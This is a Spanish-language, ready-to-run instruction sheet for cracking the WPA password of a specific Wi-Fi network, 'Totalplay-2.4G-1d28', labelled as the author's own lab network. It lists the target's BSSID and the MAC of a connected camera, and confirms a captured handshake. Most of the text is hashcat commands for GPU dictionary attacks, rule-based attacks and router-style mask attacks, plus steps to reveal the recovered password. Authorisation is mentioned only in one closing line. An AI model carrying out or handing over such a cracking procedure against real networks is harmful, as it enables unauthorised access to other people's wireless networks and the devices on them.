===============================================================================
 Paquete de crackeo WPA  -  Totalplay-2.4G-1d28  (red de laboratorio propia)
 PARA LA PC CON GPU (Windows, 12 GB)
===============================================================================

Objetivo : Totalplay-2.4G-1d28
BSSID    : 28:6E:DA:AD:1D:28   (canal 8, 2.4 GHz)
Cliente  : 6C:22:1A:C3:57:66   (cámara, AltoBeam)
Handshake: M1+M2 completo, validado (aircrack: "WPA (1 handshake)")

Archivos:
  - totalplay.hc22000   -> hash hashcat 22000 (esto es lo único imprescindible)
  - *.pcap              -> captura original (opcional)

-------------------------------------------------------------------------------
1) Instalar hashcat en Windows
-------------------------------------------------------------------------------
  - Descarga hashcat de https://hashcat.net/hashcat/  (hashcat-6.2.6.7z o similar)
  - Descomprímelo, p.ej. en  C:\hashcat\
  - Pon aquí dentro:  totalplay.hc22000  y  rockyou.txt
    (rockyou.txt: https://github.com/.../rockyou.txt  o copia el de Kali)
  - Abre PowerShell o CMD y entra a la carpeta:   cd C:\hashcat

  Comprueba que ve tu GPU:
      .\hashcat.exe -I
  (debe listar tu tarjeta como dispositivo CUDA u OpenCL)

-------------------------------------------------------------------------------
2) Crackeo por diccionario (con 12 GB de GPU: segundos)
-------------------------------------------------------------------------------
      .\hashcat.exe -m 22000 totalplay.hc22000 rockyou.txt

  Con reglas (más cobertura, sigue siendo rápido):
      .\hashcat.exe -m 22000 totalplay.hc22000 rockyou.txt -r rules\best64.rule

-------------------------------------------------------------------------------
3) Si rockyou no la encuentra: máscaras (patrones típicos de router)
-------------------------------------------------------------------------------
      .\hashcat.exe -m 22000 totalplay.hc22000 -a 3 ?d?d?d?d?d?d?d?d
      .\hashcat.exe -m 22000 totalplay.hc22000 -a 3 ?d?d?d?d?d?d?d?d?d?d
      .\hashcat.exe -m 22000 totalplay.hc22000 -a 3 -1 ?u?d ?1?1?1?1?1?1?1?1

-------------------------------------------------------------------------------
4) Ver la contraseña encontrada
-------------------------------------------------------------------------------
      .\hashcat.exe -m 22000 totalplay.hc22000 --show
  Imprime:   <hash>:<ESSID>:<contraseña>

-------------------------------------------------------------------------------
Transferir a la PC Windows (elige una):
  - USB: copia totalplay.hc22000 (y rockyou.txt).
  - O crea el archivo a mano: pega en un .txt la línea que está en
    totalplay.hc22000 (es una sola línea, 416 bytes) y guárdalo como
    totalplay.hc22000 en C:\hashcat\
  - O por red con scp/WinSCP si tienes SSH en el Windows.

Nota: usar solo en redes propias o con autorización.
===============================================================================
